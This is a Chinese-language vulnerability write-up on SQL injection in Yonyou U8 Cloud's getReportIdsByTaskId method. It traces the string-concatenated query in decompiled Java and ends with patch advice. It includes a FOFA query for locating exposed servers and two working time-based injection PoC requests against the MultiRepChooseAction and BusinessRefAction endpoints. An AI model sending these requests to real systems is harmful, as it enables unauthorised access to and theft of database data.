#  用友U8Cloud getReportIdsByTaskId方法-多处SQL注入漏洞分析   
 蓝云Sec   2025-05-02 16:01  
  
## 一、漏洞简介  
  
U8cloud系统getReportIdsByTaskId  
方法存在SQL注入漏洞，未经权限校验调用该方法的服务就会存在SQL注入漏洞，攻击者未经授权可以访问数据库中的数据，从而盗取用户数据，造成用户信息泄露。  
## 二、影响版本  
  
1.0,2.0,2.1,2.3,2.5,2.6,2.65,2.7,3.0,3.1,3.2,3.5,3.6,3.6sp,5.0,5.0sp,5.1  
## 三、漏洞分析  
  
在U8cloud系统中，有多处接口类中产生SQL注入是因为调用了同一个方法名称，即getReportIdsByTaskId  
方法  
  
在服务类MultiRepChooseAction  
方法中可以看到方法的调用逻辑  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK6fQUs1kbRDnboAGsiaMnbPfWp1JibEk73zP5cWjjj1oickHtFbtUutkcyUFwzv0j8CmEG17cPnvQPVA/640?wx_fmt=png&from=appmsg "")  
  
此处接收传参taskId  
，之后传入getReportIdsByTaskId  
方法中，追踪该方法  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK6fQUs1kbRDnboAGsiaMnbPfvuSW1cklU6RewDIn3FnpiaZkRQuibIXugnszt25e6jEVjr0coFKzQ2ow/640?wx_fmt=png&from=appmsg "")  
  
继续追踪get  
方法，此处传入taskId  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK6fQUs1kbRDnboAGsiaMnbPffWl63EZBmYG0ibCLnracpmqzrTSajqicE209pv5HlFRBoR8nY2RAz1Gw/640?wx_fmt=png&from=appmsg "")  
  
此处完整代码如下  
```
public ICacheObject get(String id) {  
if (id == null || getCacheObjName() == null)  
returnnull;   
    RefreshedObjDesc obj = null;  
    ICacheObject result = null;  
    ICacheObject tempObj = this.m_cacheStore.getRealCacheObj(id);  
    obj = (RefreshedObjDesc)this.m_cacheStore.getLWCacheObj(id);  
if (tempObj == null && obj == null) {  
try {  
        result = getCacheObjByProxy(id);  
      } catch (Exception e) {  
        AppDebug.debug(e);  
      }   
    } elseif (obj != null) {  
if (getProxy() != null) {  
        ICacheObject[] objs = null;  
try {  
          objs = getProxy().loadDatas(newString[] { id });  
if (objs != null && objs.length != 0) {  
if (obj.getOpFlag() == 0) {  
              beforeInnerAdd(objs[0]);  
              innerAdd(objs[0]);  
            } else {  
              beforeInnerUpdate(objs[0]);  
              innerUpdate(objs[0]);  
            }   
            result = objs[0];  
          } else {  
            beforeInnerRemove(id);  
            innerRemove(id);  
returnnull;  
          }   
        } catch (Exception e) {  
          AppDebug.debug(e);  
returnnull;  
        }   
      }   
    } else {  
      result = tempObj;  
    }   
return result;  
  }

```  
  
可以看到多处方法调用了传入的taskId  
，这边关注一下loadDatas  
方法  
```
objs = getProxy().loadDatas(newString[] { id });

```  
  
继续追踪，来到下面代码中  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK6fQUs1kbRDnboAGsiaMnbPfsMIgtHQ6NpKhlxYT19mB7EMQP1b9tsVAsWRFmyUO98vIetvGBFn3YQ/640?wx_fmt=png&from=appmsg "")  
  
调用id  
的方法为loadTaskById  
，继续追踪  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK6fQUs1kbRDnboAGsiaMnbPfAJz07HgArb0A8DNHAGBjvcibNUuCic0VJ3kd2xvrVzD3k6JdUniayEic2Q/640?wx_fmt=png&from=appmsg "")  
  
来到漏洞成因代码中，此处sql语句进行拼接，导致能够被闭合，关键代码如下  
```
public TaskVO[] loadTaskById(String[] aryTaskIds) throws SQLException {  
if (aryTaskIds == null || aryTaskIds.length == 0)  
returnnull;   
    Connection con = null;  
    CrossDBPreparedStatement prepStmt = null;  
    ResultSet rs = null;  
try {  
      con = getConnection();  
      StringBuffer strSqlHead = new StringBuffer("select id,pk_dir,name,note,pk_key_comb,creator,date_end,createtime,bhbtask,starttime,endtime,attatch_name,state,use_dataright,commitbytask,property_value,schemepk,sealflag,batch_rule,TIMEMAIL_RULE from ");  
      strSqlHead.append("iufo_task");  
      strSqlHead.append(" where id in(");  
int nBatchCount = 500;  
int nLoopCount = aryTaskIds.length / nBatchCount;  
int nModCount = aryTaskIds.length % nBatchCount;  
      Vector<TaskVO> vecAllTask = new Vector<\>();  
for (int i = 0; i < nLoopCount; i++) {  
        StringBuffer strIds = new StringBuffer();  
for (int j = 0; j < nBatchCount; j++) {  
          strIds.append("'");  
          strIds.append(aryTaskIds[i * nBatchCount + j]);  
          strIds.append("'");  
if (j != nBatchCount - 1)  
            strIds.append(",");   
        }   
        strIds.append(")");  
        StringBuffer strSql = new StringBuffer(strSqlHead.toString());  
        strSql.append(strIds.toString());  
        prepStmt = (CrossDBPreparedStatement)con.prepareStatement(strSql.toString());  
        rs = prepStmt.executeQuery();  
while (rs.next())  
          vecAllTask.addElement(generateTaskVO(rs));   
        rs.close();  
        prepStmt.close();  
      }

```  
  
此处SQL语句使用append  
方法进行拼接，首先  
```
      StringBuffer strSqlHead = new StringBuffer("select id,pk_dir,name,note,pk_key_comb,creator,date_end,createtime,bhbtask,starttime,endtime,attatch_name,state,use_dataright,commitbytask,property_value,schemepk,sealflag,batch_rule,TIMEMAIL_RULE from ");  
      strSqlHead.append("iufo_task");  
      strSqlHead.append(" where id in(");  

```  
  
构造了SQL语句  
```
select id,pk_dir,name,note,pk_key_comb,creator,date_end,createtime,bhbtask,starttime,endtime,attatch_name,state,use_dataright,commitbytask,property_value,schemepk,sealflag,batch_rule,TIMEMAIL_RULE from iufo_task where id in(

```  
  
其次  
```
for (int i = 0; i < nLoopCount; i++) {  
        StringBuffer strIds = new StringBuffer();  
for (int j = 0; j < nBatchCount; j++) {  
          strIds.append("'");  
          strIds.append(aryTaskIds[i * nBatchCount + j]);  
          strIds.append("'");  
if (j != nBatchCount - 1)  
            strIds.append(",");   
        }   
        strIds.append(")"); 

```  
  
对where id in(后面的参数进行拼接，参数数组中每有一个参数就添加'参数值'  
，使用逗号分隔多个参数。最后在SQL语句末尾添加)  
，完成闭合。  
  
因此完整的SQL语句就如下  
```
select id,pk_dir,name,note,pk_key_comb,creator,date_end,createtime,bhbtask,starttime,endtime,attatch_name,state,use_dataright,commitbytask,property_value,schemepk,sealflag,batch_rule,TIMEMAIL_RULE from iufo_task where id in('taskId')

```  
  
闭合的传参就是这样  
```
?taskId=1');恶意SQL语句
```  
  
分析完了方法之后，只有找到调用该危险方法的服务类就行，使用/service/~iufo/com.ufida.web.action.ActionServlet?action=  
调用指定Action类和方法，就能就行利用  
  
搜索漏洞方法名称getReportIdsByTaskId  
可以看到其他类方法，如BusinessRefAction  
也调用了该方法  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK6fQUs1kbRDnboAGsiaMnbPf7t9m0BMLZxbXmicgU4Wzg3qBOGxOovBUAMicjBXLbXLialU3VvzuHwib3Q/640?wx_fmt=png&from=appmsg "")  
  
因此此处也存在漏洞，传参taskId  
同样也可以被闭合  
## 四、总结  
  
U8cloud系统MultiRepChooseAction  
接口和BusinessRefAction  
接口的getReportIdsByTaskId  
方法中拼接SQL语句造成了SQL注入漏洞，攻击者可以构造任意的taskId  
参数，执行恶意的SQL语句。  
## 五、资产测绘  
  
FOFA语法  
```
app="用友-U8-Cloud"

```  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK6fQUs1kbRDnboAGsiaMnbPfhMiar2VajRN2Q4hCliahmTDvZrLXh6R8MIHezxhaaKSbJc0uFlVyX6Eg/640?wx_fmt=png&from=appmsg "")  
## 六、漏洞复现  
  
POC  
```
GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.web.reference.MultiRepChooseAction&method=execute&taskId=1%27);WAITFOR+DELAY+%270:0:5%27-- HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close

```  
  
延时注入5秒  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK6fQUs1kbRDnboAGsiaMnbPfmVI7mIazzWBX99lT6LeiaA3bhyUP2wkdKB6MVVKUGBQg9FXCdEfyW2g/640?wx_fmt=png&from=appmsg "")  
  
同理另外一个POC  
```
GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.web.reference.BusinessRefAction&method=getTaskRepTreeRef&taskId=1%27);WAITFOR+DELAY+%270:0:5%27-- HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Connection: close
```  
  
注入延时5秒，验证存在漏洞  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK6fQUs1kbRDnboAGsiaMnbPfmeKL00kyUymlKvDXZwcPmNKcMQY3qk8u91Xia3VoiaiagdjiaJPZC2QZibg/640?wx_fmt=png&from=appmsg "")  
## 七、修复建议  
  
安装用友U8cloud最新的补丁，或修改对应方法中拼接SQL语句的问题，使用占位符避免用户输入的参数注入到SQL语句当中。  
  
  
